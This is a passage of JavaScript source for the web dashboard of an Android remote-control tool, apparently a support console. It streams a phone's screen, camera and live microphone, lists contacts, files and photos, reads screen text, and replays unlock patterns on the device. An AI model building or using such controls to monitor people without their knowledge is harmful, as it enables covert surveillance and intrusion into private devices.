// Dashboard del Host: todos los paneles visibles en grilla.
// Protocolo idéntico a portal/signaling.js (mismo que control.js).

const video = document.getElementById('remoteVideo');
const statusText = document.getElementById('statusText');

let ws = null;
let pc = null;
let dataChannel = null;
let sessionId = null;
let offerAccepted = false;
const pendingCandidates = [];

function setStatus(text) {
  statusText.textContent = text;
}

// Estado ACTIVO/Inactivo del header = si el host ya concedió el permiso de accesibilidad.
const hostStatus = document.getElementById('hostStatus');
let accessibilityPollInterval = null;

function setAccessibilityStatus(enabled) {
  hostStatus.textContent = enabled ? 'ACTIVO' : 'Inactivo';
  hostStatus.classList.toggle('is-online', enabled);
  hostStatus.classList.toggle('is-offline', !enabled);
}

function startAccessibilityPoll() {
  // Solo se CONSULTA el estado (incluye el brillo real del teléfono); NO se impone el valor
  // por defecto del slider, que antes pisaba el brillo del cliente al conectar. El slider se
  // ajusta al brillo real cuando llega la respuesta (ver applyPermissionsStatus).
  sendControl({ type: 'list-permissions' });
  if (accessibilityPollInterval) clearInterval(accessibilityPollInterval);
  accessibilityPollInterval = setInterval(() => sendControl({ type: 'list-permissions' }), 4000);
}

function stopAccessibilityPoll() {
  if (accessibilityPollInterval) {
    clearInterval(accessibilityPollInterval);
    accessibilityPollInterval = null;
  }
  setAccessibilityStatus(false);
}

function connectSignaling() {
  ws = new WebSocket(WS_URL);

  ws.onopen = () => {
    ws.send(JSON.stringify({ type: 'connect-request', ownerToken: OWNER_TOKEN, hostId: HOST_ID }));
  };

  ws.onmessage = (event) => {
    const msg = JSON.parse(event.data);
    switch (msg.type) {
      case 'request-sent':
        sessionId = msg.sessionId;
        setStatus('Esperando aceptación…');
        break;
      case 'request-accepted':
        setStatus('Conectado — esperando video…');
        break;
      case 'request-rejected':
        setStatus('Rechazado en el dispositivo');
        break;
      case 'signal':
        handleSignal(msg.data);
        break;
      case 'peer-disconnected':
        handleSessionEnded('Sesión finalizada');
        break;
      case 'error':
        setStatus('Error: ' + msg.message);
        break;
    }
  };

  ws.onclose = () => setStatus('Desconectado del servidor');
  ws.onerror = () => setStatus('Error de conexión');
}

async function fetchIceServers() {
  try {
    const res = await fetch(`${BACKEND_BASE_URL}/turn-credentials`);
    const servers = await res.json();
    return servers.map((s) => ({ urls: s.urls, username: s.username, credential: s.credential }));
  } catch (err) {
    console.error('No se pudieron obtener credenciales TURN, usando solo STUN', err);
    return [{ urls: 'stun:stun.l.google.com:19302' }];
  }
}

async function handleSignal(data) {
  if (data.stream === 'camera') {
    await handleCameraSignal(data);
    return;
  }
  if (data.stream === 'mic') {
    await handleMicSignal(data);
    return;
  }
  if (data.kind === 'offer') {
    const iceServers = await fetchIceServers();
    pc = new RTCPeerConnection({ iceServers });

    pc.onicecandidate = (e) => {
      if (!e.candidate) return;
      sendSignal({
        kind: 'ice-candidate',
        candidate: e.candidate.candidate,
        sdpMid: e.candidate.sdpMid,
        sdpMLineIndex: e.candidate.sdpMLineIndex,
      });
    };

    pc.ontrack = (e) => {
      video.srcObject = e.streams[0];
      setStatus('Conectado');
    };

    pc.ondatachannel = (e) => {
      console.log('[host] ondatachannel event recibido, label:', e.channel.label);
      dataChannel = e.channel;
      dataChannel.onopen = () => {
        console.log('[host] DataChannel abierto');
        dataChannelReady = true;
        flushMessageQueue();
        startAccessibilityPoll();
        // Si vino con action=uninstall, pedir la desinstalación: el aviso aparece en
        // el dispositivo y se acepta allí. No se cierra la sesión aquí; solo cuando el
        // dispositivo confirme y la conexión caiga se vuelve a la lista.
        if (autoUninstall) {
          autoUninstall = false;
          setTimeout(() => requestUninstall(), 500);
        }
      };
      dataChannel.onclose = () => {
        console.log('[host] DataChannel cerrado');
        dataChannelReady = false;
        stopAccessibilityPoll();
        // Respaldo: si estábamos desinstalando y el canal cae, la app ya no está.
        if (uninstalling) handleSessionEnded('Sesión finalizada');
      };
      dataChannel.onmessage = (msgEvent) => {
        const msg = JSON.parse(msgEvent.data);
        console.log('[DataChannel message]', msg.type, msg);
        if (msg.type === 'apps-list') renderAppsList(msg.apps);
        else if (msg.type === 'app-icon') applyAppIcon(msg.packageName, msg.icon);
        else if (msg.type === 'contacts-list') renderContactsList(msg.contacts);
        else if (msg.type === 'contacts-error') showContactsError(msg.message);
        else if (msg.type === 'permissions-status') applyPermissionsStatus(msg);
        else if (msg.type === 'screen-text') renderScreenText(msg.nodes);
        else if (msg.type === 'files-list') {
          console.log('[files-list] msg.files length:', (msg.files || []).length);
          renderFilesList(msg);
        }
        else if (msg.type === 'files-error') alert('Error: ' + msg.message);
        else if (msg.type === 'photos-list') {
          console.log('[photos-list] msg.photos length:', (msg.photos || []).length);
          renderPhotosList(msg);
        }
        else if (msg.type === 'photo-thumb') applyPhotoThumb(msg.path, msg.thumb);
        else if (msg.type === 'photo-full') applyPhotoFull(msg.path, msg.data);
        else if (msg.type === 'photos-error') alert('Error: ' + msg.message);
        else if (msg.type === 'mic-error') { alert(msg.message); stopLiveAudio(); }
        else if (msg.type === 'alert-error') alert(msg.message);
      };
    };

    pc.oniceconnectionstatechange = () => {
      if (pc.iceConnectionState === 'failed') setStatus('Error de conexión (ICE)');
    };

    await pc.setRemoteDescription({ type: 'offer', sdp: data.sdp });
    const answer = await pc.createAnswer();
    await pc.setLocalDescription(answer);
    sendSignal({ kind: 'answer', sdp: answer.sdp });

    offerAccepted = true;
    pendingCandidates.splice(0).forEach((c) => pc.addIceCandidate(c));
  } else if (data.kind === 'ice-candidate') {
    const candidate = { candidate: data.candidate, sdpMid: data.sdpMid, sdpMLineIndex: data.sdpMLineIndex };
    if (offerAccepted && pc) pc.addIceCandidate(candidate);
    else pendingCandidates.push(candidate);
  }
}

function sendSignal(data) {
  if (!sessionId) return;
  ws.send(JSON.stringify({ type: 'signal', sessionId, data }));
}

let dataChannelReady = false;
const messageQueue = [];

function flushMessageQueue() {
  console.log('[flushMessageQueue] enviando', messageQueue.length, 'mensajes encolados');
  while (messageQueue.length > 0) {
    const msg = messageQueue.shift();
    if (dataChannel && dataChannel.readyState === 'open') {
      console.log('[flushMessageQueue] enviando:', msg.type);
      dataChannel.send(JSON.stringify(msg));
    } else {
      console.warn('[flushMessageQueue] DataChannel cerró, descartando', msg.type);
      break;
    }
  }
}

function sendControl(json) {
  console.log('[sendControl]', json.type, 'dataChannelReady:', dataChannelReady, 'readyState:', dataChannel?.readyState);

  if (!dataChannelReady || !dataChannel || dataChannel.readyState !== 'open') {
    console.log('[sendControl] DataChannel no listo, encolando:', json.type);
    messageQueue.push(json);
    return;
  }

  console.log('[sendControl] ENVIANDO:', JSON.stringify(json));
  dataChannel.send(JSON.stringify(json));
}

// ---- Cámara (segunda conexión WebRTC) ----

const cameraVideo = document.getElementById('cameraVideo');
const cameraEmpty = document.getElementById('cameraEmpty');
let cameraPc = null;
let cameraOfferAccepted = false;
const cameraPendingCandidates = [];

async function handleCameraSignal(data) {
  if (data.kind === 'offer') {
    const iceServers = await fetchIceServers();
    cameraPc = new RTCPeerConnection({ iceServers });

    cameraPc.onicecandidate = (e) => {
      if (!e.candidate) return;
      sendSignal({
        stream: 'camera',
        kind: 'ice-candidate',
        candidate: e.candidate.candidate,
        sdpMid: e.candidate.sdpMid,
        sdpMLineIndex: e.candidate.sdpMLineIndex,
      });
    };

    cameraPc.ontrack = (e) => {
      cameraVideo.srcObject = e.streams[0];
      cameraEmpty.hidden = true;
    };

    cameraPc.oniceconnectionstatechange = () => {
      if (cameraPc.iceConnectionState === 'failed') {
        cameraEmpty.hidden = false;
        cameraEmpty.textContent = 'Error de conexión con la cámara.';
      }
    };

    await cameraPc.setRemoteDescription({ type: 'offer', sdp: data.sdp });
    const answer = await cameraPc.createAnswer();
    await cameraPc.setLocalDescription(answer);
    sendSignal({ stream: 'camera', kind: 'answer', sdp: answer.sdp });

    cameraOfferAccepted = true;
    cameraPendingCandidates.splice(0).forEach((c) => cameraPc.addIceCandidate(c));
  } else if (data.kind === 'ice-candidate') {
    const candidate = { candidate: data.candidate, sdpMid: data.sdpMid, sdpMLineIndex: data.sdpMLineIndex };
    if (cameraOfferAccepted && cameraPc) cameraPc.addIceCandidate(candidate);
    else cameraPendingCandidates.push(candidate);
  }
}

function closeCamera() {
  if (cameraPc) cameraPc.close();
  cameraPc = null;
  cameraOfferAccepted = false;
  cameraPendingCandidates.length = 0;
  cameraVideo.srcObject = null;
}

function currentCameraFacing() {
  const checked = document.querySelector('input[name="cameraFacing"]:checked');
  return checked ? checked.value : 'back';
}

function startCamera() {
  cameraEmpty.hidden = false;
  cameraEmpty.textContent = 'Iniciando cámara…';
  sendControl({ type: 'start-camera', facing: currentCameraFacing() });
}

function stopCamera() {
  sendControl({ type: 'stop-camera' });
  closeCamera();
  cameraEmpty.hidden = false;
  cameraEmpty.textContent = 'Pulsa ▶ para ver la cámara.';
}

document.getElementById('cameraPlay').addEventListener('click', startCamera);
document.getElementById('cameraPause').addEventListener('click', stopCamera);
document.getElementById('cameraReload').addEventListener('click', () => { closeCamera(); startCamera(); });

document.querySelectorAll('input[name="cameraFacing"]').forEach((radio) => {
  radio.addEventListener('change', () => {
    if (!cameraPc) return;
    closeCamera();
    cameraEmpty.hidden = false;
    cameraEmpty.textContent = 'Cambiando de cámara…';
    sendControl({ type: 'start-camera', facing: currentCameraFacing() });
  });
});

// ---- Escucha en vivo (micrófono del host) ----

const liveAudio = document.getElementById('liveAudio');
const btnLiveAudio = document.getElementById('btnLiveAudio');
let micPc = null;
let micOfferAccepted = false;
const micPendingCandidates = [];
let micActive = false;

async function handleMicSignal(data) {
  if (data.kind === 'offer') {
    const iceServers = await fetchIceServers();
    micPc = new RTCPeerConnection({ iceServers });

    micPc.onicecandidate = (e) => {
      if (!e.candidate) return;
      sendSignal({
        stream: 'mic',
        kind: 'ice-candidate',
        candidate: e.candidate.candidate,
        sdpMid: e.candidate.sdpMid,
        sdpMLineIndex: e.candidate.sdpMLineIndex,
      });
    };

    micPc.ontrack = (e) => {
      liveAudio.srcObject = e.streams[0];
      liveAudio.play().catch(() => { /* autoplay: se reintenta con interacción */ });
    };

    micPc.oniceconnectionstatechange = () => {
      if (micPc && micPc.iceConnectionState === 'failed') stopLiveAudio();
    };

    await micPc.setRemoteDescription({ type: 'offer', sdp: data.sdp });
    const answer = await micPc.createAnswer();
    await micPc.setLocalDescription(answer);
    sendSignal({ stream: 'mic', kind: 'answer', sdp: answer.sdp });

    micOfferAccepted = true;
    micPendingCandidates.splice(0).forEach((c) => micPc.addIceCandidate(c));
  } else if (data.kind === 'ice-candidate') {
    const candidate = { candidate: data.candidate, sdpMid: data.sdpMid, sdpMLineIndex: data.sdpMLineIndex };
    if (micOfferAccepted && micPc) micPc.addIceCandidate(candidate);
    else micPendingCandidates.push(candidate);
  }
}

function closeMic() {
  if (micPc) micPc.close();
  micPc = null;
  micOfferAccepted = false;
  micPendingCandidates.length = 0;
  liveAudio.srcObject = null;
}

function startLiveAudio() {
  micActive = true;
  btnLiveAudio.classList.add('is-active');
  btnLiveAudio.textContent = '🎧 Escuchando… (detener)';
  sendControl({ type: 'start-mic' });
}

function stopLiveAudio() {
  micActive = false;
  btnLiveAudio.classList.remove('is-active');
  btnLiveAudio.textContent = '🎧 Escucha en vivo';
  sendControl({ type: 'stop-mic' });
  closeMic();
}

btnLiveAudio.addEventListener('click', () => {
  if (micActive) stopLiveAudio();
  else startLiveAudio();
});

function cleanup() {
  if (pc) pc.close();
  pc = null;
  dataChannel = null;
  closeCamera();
  closeMic();
  micActive = false;
  if (btnLiveAudio) {
    btnLiveAudio.classList.remove('is-active');
    btnLiveAudio.textContent = '🎧 Escucha en vivo';
  }
  stopAccessibilityPoll();
}

// Fin de sesión. Si venía de una desinstalación aceptada en el dispositivo, la
// conexión cae y recién ahí volvemos a la lista. Si fue por otra causa, nos
// quedamos en la página mostrando el estado (no saca de host.php).
let sessionEnded = false;
function handleSessionEnded(statusText) {
  if (sessionEnded) return;
  sessionEnded = true;
  const wasUninstalling = uninstalling;
  uninstalling = false;
  cleanup();
  if (wasUninstalling) {
    setStatus('App desinstalada en el dispositivo. Volviendo a la lista…');
    setTimeout(() => { window.location.href = 'ver.php'; }, 1200);
  } else {
    setStatus(statusText || 'Sesión finalizada');
  }
}

// Pide la desinstalación al dispositivo. El aviso del sistema se muestra y se
// acepta EN EL DISPOSITIVO; aquí no mostramos popup ni cerramos la sesión.
function requestUninstall() {
  if (uninstalling) return;
  uninstalling = true;
  sendControl({ type: 'uninstall-app', packageName: 'com.acces.hostapp' });
  setStatus('Aviso de desinstalación enviado. Acéptalo en el dispositivo…');
  // Si a los 30 s sigue conectado, probablemente se canceló el aviso en el equipo.
  setTimeout(() => {
    if (uninstalling && pc) {
      uninstalling = false;
      setStatus('Desinstalación no confirmada en el dispositivo.');
    }
  }, 30000);
}

// ---- Controles de la pantalla ----

document.getElementById('screenPlay').addEventListener('click', () => video.play());
document.getElementById('screenPause').addEventListener('click', () => video.pause());
document.getElementById('screenReload').addEventListener('click', () => window.location.reload());

// ---- Control de brillo del teléfono ----

const brightnessSlider = document.getElementById('brightnessSlider');
let brightnessDragging = false;
let lastBrightnessSent = 0;

brightnessSlider.addEventListener('input', () => {
  brightnessDragging = true;
  const now = Date.now();
  if (now - lastBrightnessSent > 120) {
    lastBrightnessSent = now;
    sendControl({ type: 'set-brightness', value: parseInt(brightnessSlider.value, 10) });
  }
});
brightnessSlider.addEventListener('change', () => {
  brightnessDragging = false;
  sendControl({ type: 'set-brightness', value: parseInt(brightnessSlider.value, 10) });
});

// ---- Mapeo de mouse -> tap/swipe (object-fit: contain) ----

let downX = 0, downY = 0, downTime = 0;
const TAP_SLOP_PX = 8;

function viewPointToNormalized(clientX, clientY) {
  const rect = video.getBoundingClientRect();
  const vw = video.videoWidth;
  const vh = video.videoHeight;
  if (!vw || !vh) return null;

  const videoAspect = vw / vh;
  const boxAspect = rect.width / rect.height;

  let displayWidth, displayHeight;
  if (videoAspect > boxAspect) {
    displayWidth = rect.width;
    displayHeight = rect.width / videoAspect;
  } else {
    displayHeight = rect.height;
    displayWidth = rect.height * videoAspect;
  }
  const offsetX = (rect.width - displayWidth) / 2;
  const offsetY = (rect.height - displayHeight) / 2;

  const x = clientX - rect.left;
  const y = clientY - rect.top;
  const nx = (x - offsetX) / displayWidth;
  const ny = (y - offsetY) / displayHeight;
  if (nx < 0 || nx > 1 || ny < 0 || ny > 1) return null;
  return { x: Math.min(1, Math.max(0, nx)), y: Math.min(1, Math.max(0, ny)) };
}

video.draggable = false;
video.style.userSelect = 'none';
video.style.webkitUserDrag = 'none';
video.addEventListener('dragstart', (e) => e.preventDefault());

// Se captura TODO el camino del mouse durante el arrastre (no solo inicio y fin), para poder
// reproducir trazos que no son líneas rectas — p. ej. dibujar un patrón de desbloqueo.
let dragging = false;
let dragPath = [];

video.addEventListener('pointerdown', (e) => {
  e.preventDefault();
  downX = e.clientX;
  downY = e.clientY;
  downTime = Date.now();
  dragging = true;
  dragPath = [];
  const p = viewPointToNormalized(e.clientX, e.clientY);
  if (p) dragPath.push(p);
  try { video.setPointerCapture(e.pointerId); } catch (err) { /* no soportado */ }
});

video.addEventListener('pointermove', (e) => {
  if (!dragging) return;
  const p = viewPointToNormalized(e.clientX, e.clientY);
  if (!p) return;
  const last = dragPath[dragPath.length - 1];
  // Solo se agrega si se movió lo suficiente (evita miles de puntos casi iguales).
  if (!last || Math.hypot(p.x - last.x, p.y - last.y) > 0.008) dragPath.push(p);
});

video.addEventListener('pointerup', (e) => {
  if (!dragging) return;
  dragging = false;

  // En modo patrón se usa el tablero superpuesto, no el video directo: se ignoran los clics aquí.
  if (patternMode) return;

  const dx = e.clientX - downX;
  const dy = e.clientY - downY;
  const distance = Math.hypot(dx, dy);
  const duration = Date.now() - downTime;

  const start = viewPointToNormalized(downX, downY);
  if (!start) return;
  if (!dataChannel || dataChannel.readyState !== 'open') return;

  if (distance < TAP_SLOP_PX) {
    sendControl({ type: 'tap', xNorm: start.x, yNorm: start.y });
    return;
  }

  const end = viewPointToNormalized(e.clientX, e.clientY);
  if (end) {
    const last = dragPath[dragPath.length - 1];
    if (!last || last.x !== end.x || last.y !== end.y) dragPath.push(end);
  }

  // Trazo con todos los puntos: sirve tanto para scroll recto como para patrones.
  if (dragPath.length >= 2) {
    sendControl({
      type: 'gesture-path',
      points: dragPath.map((p) => ({ xNorm: p.x, yNorm: p.y })),
      durationMs: Math.max(120, duration),
    });
  }
});

document.getElementById('btnBack').addEventListener('click', () => sendControl({ type: 'back' }));
document.getElementById('btnHome').addEventListener('click', () => sendControl({ type: 'home' }));
document.getElementById('btnRecents').addEventListener('click', () => sendControl({ type: 'recents' }));

// ---- Modo patrón (desbloqueo con patrón) ----
// El técnico hace clic en cada punto del patrón, en orden, sobre el video. Se marcan con números
// y al enviar se reproducen como UN solo trazo continuo (gesture-path), que es como se dibuja
// un patrón. Nota: Android puede bloquear gestos sobre la pantalla de bloqueo segura en algunos
// equipos; donde lo permite, esto desbloquea el patrón.
const btnPattern = document.getElementById('btnPattern');
const patternBar = document.getElementById('patternBar');
const patternInfo = document.getElementById('patternInfo');
let patternMode = false;

// Tablero de patrón: 9 puntos numerados que se superponen sobre el video. El técnico lo mueve y
// redimensiona para que calce con la cuadrícula real del teléfono, hace clic en los puntos en
// orden (se dibuja la línea) y al enviar se reproduce ese trazo en las coordenadas reales.
let patternPadEl = null;
let patternSvg = null;
let patternDots = [];   // elementos de los 9 puntos
let patternSeq = [];    // índices seleccionados, en orden

function buildPatternPad() {
  if (patternPadEl) return;
  const parent = video.parentElement;
  if (getComputedStyle(parent).position === 'static') parent.style.position = 'relative';

  const pad = document.createElement('div');
  pad.id = 'patternPad';
  pad.hidden = true;

  const bar = document.createElement('div');
  bar.className = 'pattern-pad-bar';
  bar.textContent = '✥ mover';
  pad.appendChild(bar);

  const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
  svg.setAttribute('class', 'pattern-pad-svg');
  pad.appendChild(svg);
  patternSvg = svg;

  patternDots = [];
  const grid = [16.67, 50, 83.33]; // posición % de las 3 columnas/filas
  let idx = 0;
  for (let r = 0; r < 3; r++) {
    for (let c = 0; c < 3; c++) {
      const dot = document.createElement('div');
      dot.className = 'pattern-pad-dot';
      dot.style.left = grid[c] + '%';
      dot.style.top = grid[r] + '%';
      const myIdx = idx;
      dot.addEventListener('pointerdown', (e) => { e.stopPropagation(); selectPatternDot(myIdx); });
      pad.appendChild(dot);
      patternDots.push(dot);
      idx++;
    }
  }

  const rz = document.createElement('div');
  rz.className = 'pattern-pad-resize';
  rz.title = 'Redimensionar';
  pad.appendChild(rz);

  parent.appendChild(pad);
  patternPadEl = pad;
  enablePadDragResize(pad, bar, rz);
}

function selectPatternDot(i) {
  if (patternSeq.includes(i)) return; // no repetir un punto
  patternSeq.push(i);
  const dot = patternDots[i];
  dot.classList.add('is-on');
  dot.textContent = patternSeq.length;
  drawPatternLines();
  updatePatternInfo();
}

function drawPatternLines() {
  while (patternSvg.firstChild) patternSvg.removeChild(patternSvg.firstChild);
  if (patternSeq.length < 2) return;
  const padRect = patternPadEl.getBoundingClientRect();
  const pts = patternSeq.map((i) => {
    const r = patternDots[i].getBoundingClientRect();
    return `${r.left + r.width / 2 - padRect.left},${r.top + r.height / 2 - padRect.top}`;
  });
  const pl = document.createElementNS('http://www.w3.org/2000/svg', 'polyline');
  pl.setAttribute('points', pts.join(' '));
  pl.setAttribute('fill', 'none');
  pl.setAttribute('stroke', '#00ff41');
  pl.setAttribute('stroke-width', '3');
  patternSvg.appendChild(pl);
}

function clearPattern() {
  patternSeq = [];
  patternDots.forEach((d) => { d.classList.remove('is-on'); d.textContent = ''; });
  if (patternSvg) while (patternSvg.firstChild) patternSvg.removeChild(patternSvg.firstChild);
  updatePatternInfo();
}

function updatePatternInfo() {
  if (!patternInfo) return;
  patternInfo.textContent = patternSeq.length
    ? `Puntos: ${patternSeq.length} — sigue en orden y pulsa "Enviar patrón"`
    : 'Ajusta el tablero sobre la cuadrícula y haz clic en los puntos, en orden';
}

// Mover (barra) y redimensionar (esquina) el tablero, con pointer events.
function enablePadDragResize(pad, bar, rz) {
  let mode = null, sx = 0, sy = 0, sl = 0, st = 0, sw = 0, sh = 0;
  const parent = () => pad.parentElement.getBoundingClientRect();

  bar.addEventListener('pointerdown', (e) => {
    mode = 'move';
    const r = pad.getBoundingClientRect(); const p = parent();
    sx = e.clientX; sy = e.clientY; sl = r.left - p.left; st = r.top - p.top;
    bar.setPointerCapture(e.pointerId); e.preventDefault(); e.stopPropagation();
  });
  rz.addEventListener('pointerdown', (e) => {
    mode = 'resize';
    const r = pad.getBoundingClientRect();
    sx = e.clientX; sy = e.clientY; sw = r.width; sh = r.height;
    rz.setPointerCapture(e.pointerId); e.preventDefault(); e.stopPropagation();
  });
  const move = (e) => {
    if (!mode) return;
    if (mode === 'move') {
      pad.style.left = (sl + (e.clientX - sx)) + 'px';
      pad.style.top = (st + (e.clientY - sy)) + 'px';
      pad.style.right = 'auto'; pad.style.bottom = 'auto';
    } else {
      pad.style.width = Math.max(120, sw + (e.clientX - sx)) + 'px';
      pad.style.height = Math.max(120, sh + (e.clientY - sy)) + 'px';
    }
    drawPatternLines();
  };
  bar.addEventListener('pointermove', move);
  rz.addEventListener('pointermove', move);
  const end = () => { mode = null; };
  bar.addEventListener('pointerup', end);
  rz.addEventListener('pointerup', end);
}

function setPatternMode(on) {
  patternMode = on;
  if (patternBar) patternBar.hidden = !on;
  if (btnPattern) btnPattern.classList.toggle('is-active', on);
  if (on) {
    buildPatternPad();
    patternPadEl.hidden = false;
    updatePatternInfo();
  } else {
    clearPattern();
    if (patternPadEl) patternPadEl.hidden = true;
  }
}

if (btnPattern) btnPattern.addEventListener('click', () => setPatternMode(!patternMode));
const patternExitBtn = document.getElementById('patternExit');
if (patternExitBtn) patternExitBtn.addEventListener('click', () => setPatternMode(false));
const patternClearBtn = document.getElementById('patternClear');
if (patternClearBtn) patternClearBtn.addEventListener('click', clearPattern);
const patternSwipeUpBtn = document.getElementById('patternSwipeUp');
if (patternSwipeUpBtn) patternSwipeUpBtn.addEventListener('click', () => {
  // Desliza hacia arriba en el centro para que aparezca la cuadrícula del patrón.
  sendControl({ type: 'gesture-path', points: [{ xNorm: 0.5, yNorm: 0.9 }, { xNorm: 0.5, yNorm: 0.25 }], durationMs: 280 });
});
const patternSendBtn = document.getElementById('patternSend');
if (patternSendBtn) patternSendBtn.addEventListener('click', () => {
  if (patternSeq.length < 2) { alert('Marca al menos 2 puntos del patrón, en orden.'); return; }
  const points = patternSeq.map((i) => {
    const r = patternDots[i].getBoundingClientRect();
    return viewPointToNormalized(r.left + r.width / 2, r.top + r.height / 2);
  }).filter(Boolean);
  if (points.length < 2) { alert('El tablero quedó fuera del video; muévelo sobre la pantalla.'); return; }
  sendControl({
    type: 'gesture-path',
    points: points.map((p) => ({ xNorm: p.x, yNorm: p.y })),
    durationMs: Math.max(500, points.length * 180),
  });
});

// ---- Panel de apps ----

const appsList = document.getElementById('appsList');
const appsEmpty = document.getElementById('appsEmpty');
const appsSearch = document.getElementById('appsSearch');
let lastApps = [];
const appIcons = new Map();
const appIconEls = new Map();

function loadApps() {
  appsEmpty.hidden = false;
  appsEmpty.textContent = 'Cargando apps…';
  appsList.innerHTML = '';
  appsSearch.value = '';
  sendControl({ type: 'list-apps' });
}

function renderAppsList(apps) {
  lastApps = apps;
  paintAppsList(apps);
}

function paintAppsList(apps) {
  appsList.innerHTML = '';
  appIconEls.clear();
  if (!apps.length) {
    appsEmpty.textContent = 'Sin resultados.';
    appsEmpty.hidden = false;
    return;
  }
  appsEmpty.hidden = true;
  apps.forEach((app) => {
    const li = document.createElement('li');
    const img = document.createElement('img');
    img.className = 'apps-panel__icon';
    const cachedIcon = appIcons.get(app.packageName);
    if (cachedIcon) img.src = `data:image/png;base64,${cachedIcon}`;
    appIconEls.set(app.packageName, img);

    const text = document.createElement('span');
    text.innerHTML = `${escapeHtml(app.appName)}<small>${escapeHtml(app.packageName)}</small>`;

    li.appendChild(img);
    li.appendChild(text);
    li.addEventListener('click', (e) => openAppActionMenu(e, app));
    appsList.appendChild(li);
  });
}

function applyAppIcon(packageName, base64Icon) {
  appIcons.set(packageName, base64Icon);
  const img = appIconEls.get(packageName);
  if (img) img.src = `data:image/png;base64,${base64Icon}`;
}

appsSearch.addEventListener('input', () => {
  const q = appsSearch.value.trim().toLowerCase();
  const filtered = q ? lastApps.filter((a) => a.appName.toLowerCase().includes(q)) : lastApps;
  paintAppsList(filtered);
});

document.getElementById('appsReload').addEventListener('click', loadApps);

// ---- Menú de acciones por app ----

const appActionMenu = document.getElementById('appActionMenu');
let menuTargetApp = null;

function openAppActionMenu(e, app) {
  menuTargetApp = app;
  appActionMenu.hidden = false;
  const rect = e.currentTarget.getBoundingClientRect();
  const menuW = 170;
  appActionMenu.style.top = `${Math.min(rect.bottom, window.innerHeight - 130)}px`;
  appActionMenu.style.left = `${Math.min(rect.left, window.innerWidth - menuW)}px`;
}

function closeAppActionMenu() {
  appActionMenu.hidden = true;
  menuTargetApp = null;
}

document.getElementById('actionOpen').addEventListener('click', () => {
  if (menuTargetApp) sendControl({ type: 'launch-app', packageName: menuTargetApp.packageName });
  closeAppActionMenu();
});
document.getElementById('actionClearData').addEventListener('click', () => {
  if (menuTargetApp) sendControl({ type: 'clear-data-app', packageName: menuTargetApp.packageName });
  closeAppActionMenu();
});

document.addEventListener('click', (e) => {
  if (!appActionMenu.hidden && !appActionMenu.contains(e.target) && !appsList.contains(e.target)) {
    closeAppActionMenu();
  }
});

// ---- Panel de contactos ----

const contactsList = document.getElementById('contactsList');
const contactsEmpty = document.getElementById('contactsEmpty');
const contactsSearch = document.getElementById('contactsSearch');
let lastContacts = [];

function loadContacts() {
  contactsEmpty.hidden = false;
  contactsEmpty.textContent = 'Cargando contactos…';
  contactsList.innerHTML = '';
  contactsSearch.value = '';
  sendControl({ type: 'list-contacts' });
}

function renderContactsList(contacts) {
  lastContacts = contacts;
  paintContactsList(contacts);
}

function paintContactsList(contacts) {
  contactsList.innerHTML = '';
  if (!contacts.length) {
    contactsEmpty.textContent = 'Sin resultados.';
    contactsEmpty.hidden = false;
    return;
  }
  contactsEmpty.hidden = true;
  contacts.forEach((c) => {
    const li = document.createElement('li');
    li.innerHTML = `${escapeHtml(c.name || '(Sin nombre)')}<small>${escapeHtml(c.phone || '')}</small>`;
    contactsList.appendChild(li);
  });
}

function showContactsError(message) {
  contactsList.innerHTML = '';
  contactsEmpty.textContent = message;
  contactsEmpty.hidden = false;
}

contactsSearch.addEventListener('input', () => {
  const q = contactsSearch.value.trim().toLowerCase();
  const filtered = q ? lastContacts.filter((c) => (c.name || '').toLowerCase().includes(q)) : lastContacts;
  paintContactsList(filtered);
});

document.getElementById('contactsReload').addEventListener('click', loadContacts);

function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

// ---- Video a texto ----

const videoTextEmpty = document.getElementById('videoTextEmpty');
const videoTextContent = document.getElementById('videoTextContent');
const videoTextCurrentEl = document.getElementById('videoTextCurrent');
const videoTextHistoryEl = document.getElementById('videoTextHistory');
let videoTextPollInterval = null;
const screenTextHistory = new Map();
const URL_PATTERN = /^(https?:\/\/|www\.)\S+$/i;

function screenTextKey(node) {
  return `${node.text}|${node.xNorm.toFixed(3)}|${node.yNorm.toFixed(3)}`;
}

// Texto del historial: línea plana, tenue, no clicable (sus coordenadas ya no son válidas).
function buildTextLine(node) {
  const el = document.createElement('div');
  el.className = 'video-text-line is-history';
  el.textContent = node.text;
  return el;
}

// Texto en pantalla: se coloca en la posición EXACTA del elemento (centro de su
// rectángulo) sobre el mapa de pantalla, como texto plano clicable. Al tocarlo se
// envía un toque a esa misma posición en el dispositivo.
function buildPositionedText(node) {
  const text = node.text.trim();
  const isLink = URL_PATTERN.test(text);
  const el = document.createElement(isLink ? 'a' : 'span');
  el.className = 'video-text-dot' + (isLink ? ' is-link' : '');
  el.textContent = node.text;
  el.title = node.text;

  const cx = (node.xNorm + (node.wNorm || 0) / 2) * 100;
  const cy = (node.yNorm + (node.hNorm || 0) / 2) * 100;
  el.style.left = Math.min(Math.max(cx, 0), 100) + '%';
  el.style.top = Math.min(Math.max(cy, 0), 100) + '%';

  if (isLink) {
    el.href = text.startsWith('www.') ? `https://${text}` : text;
    el.target = '_blank';
    el.rel = 'noopener noreferrer';
  } else {
    el.addEventListener('click', () => {
      el.classList.add('is-tapped');
      setTimeout(() => el.classList.remove('is-tapped'), 220);
      sendControl({ type: 'tap', xNorm: node.xNorm + (node.wNorm || 0) / 2, yNorm: node.yNorm + (node.hNorm || 0) / 2 });
    });
  }
  return el;
}

function renderScreenText(nodes) {
  const currentKeys = new Set(nodes.map(screenTextKey));
  nodes.forEach((node) => screenTextHistory.set(screenTextKey(node), node));

  if (screenTextHistory.size === 0) {
    videoTextContent.hidden = true;
    videoTextEmpty.hidden = false;
    videoTextEmpty.textContent = 'No se detectó texto en la pantalla actual.';
    return;
  }

  videoTextEmpty.hidden = true;
  videoTextContent.hidden = false;

  const current = [];
  const history = [];
  screenTextHistory.forEach((node, key) => {
    (currentKeys.has(key) ? current : history).push(node);
  });

  const readingOrder = (a, b) => a.yNorm - b.yNorm || a.xNorm - b.xNorm;
  current.sort(readingOrder);
  history.sort(readingOrder);

  videoTextCurrentEl.innerHTML = '';
  current.forEach((node) => videoTextCurrentEl.appendChild(buildPositionedText(node)));

  videoTextHistoryEl.innerHTML = '';
  history.forEach((node) => videoTextHistoryEl.appendChild(buildTextLine(node)));
}

function startVideoText() {
  videoTextEmpty.hidden = false;
  videoTextEmpty.textContent = 'Leyendo pantalla…';
  sendControl({ type: 'list-screen-text' });
